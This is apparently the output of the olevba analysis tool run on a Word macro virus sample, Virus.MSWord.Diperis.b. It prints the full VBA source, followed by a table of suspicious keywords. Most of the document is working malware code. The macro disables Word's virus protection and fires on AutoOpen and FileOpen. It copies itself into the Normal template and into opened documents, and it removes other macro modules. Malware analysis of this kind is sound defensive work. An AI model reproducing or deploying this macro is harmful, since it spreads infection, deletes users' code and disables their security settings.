olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Diperis.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Diperis.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MrQ.bas 
in file: Virus.MSWord.Diperis.b - OLE stream: 'Macros/VBA/MrQ'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub RekordMacro()
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
    CommandBars.ActiveMenuBar.Enabled = True
    CommandBars("Control Toolbox").Enabled = True
    CommandBars("Forms").Enabled = True
    CommandBars("ActiveX Control").Enabled = True
    CommandBars("Visual Basic").Enabled = True
On Error Resume Next
InfeksiNormal
z = 0
On Error Resume Next
For Each obj In ActiveDocument.VBProject.VBComponents
           z = z + 1
     If obj.Name = "MrQ" Or obj.Name = "ThisDocument" Then
     GoTo lompat
     End If
            Set mok = ActiveDocument.VBProject.VBComponents.Item(z)
            xx = mok.CodeModule.CountOfLines
            xy = Int(xx / 25) + 1
            x = 0
            xyz = 1
            While x < xy
            xad1 = mok.CodeModule.Lines(xyz, 25)
            x = x + 1
            xyz = xyz + 25
            Wend
            ActiveDocument.VBProject.VBComponents(z).Export "c:\my documents\" & obj.Name & "_VirusMacro.txt"
            ActiveDocument.VBProject.VBComponents.Remove ActiveDocument.VBProject.VBComponents(obj.Name)
lompat:
 Next obj
    On Error Resume Next
    For Each obj In NormalTemplate.VBProject.VBComponents
        If obj.Name <> "MrQ" And obj.Name <> "ThisDocument" Then
            NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents(obj.Name)
        End If
    Next obj
    On Error Resume Next
    InfeksiFile
    On Error Resume Next
    ActiveDocument.Save
    On Error Resume Next
    NormalTemplate.Save
End Sub

Sub FileOpen()
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
    RekordMacro
    End If
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    InfeksiNormal
    RekordMacro
    WordBasic.DisableAutoMacros False
End Sub

Sub InfeksiNormal()
TempPath = Application.NormalTemplate.Path & Application.PathSeparator
Set Sumber = ActiveDocument
Set Target = NormalTemplate
sehat = False
For Each obj In Target.VBProject.VBComponents
      If obj.Name = "MrQ" Then sehat = True
      If (obj.Name <> "ThisDocument") And (obj.Name <> "Reference To Normal") And (obj.Name <> "MrQ") Then
            Target.VBProject.VBComponents.Remove Target.VBProject.VBComponents(obj.Name)
            objKorban = True
            End If
            Next obj
      If sehat = False Then
    x = Infect(Sumber, Target, "MrQ")
    End If
End Sub

Function Infect(Sumber, Target, obj As String) As Boolean
On Error GoTo ILari
    Sumber.VBProject.VBComponents(obj).Export TempPath & obj
    Target.VBProject.VBComponents.Import TempPath & obj
    Infect = True
    Kill TempPath & obj
Exit Function
ILari:
End Function

Sub InfeksiFile()
TempPath = Application.NormalTemplate.Path & Application.PathSeparator
Set Sumber = NormalTemplate
Set Target = ActiveDocument
sehat = False
For Each obj In Target.VBProject.VBComponents
      If obj.Name = "MrQ" Then sehat = True
      If (obj.Name <> "ThisDocument") And (obj.Name <> "Reference To Normal") And (obj.Name <> "MrQ") Then
            Target.VBProject.VBComponents.Remove Target.VBProject.VBComponents(obj.Name)
            objKorban = True
            End If
            Next obj
      If sehat = False Then
    x = Infect(Sumber, Target, "MrQ")
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

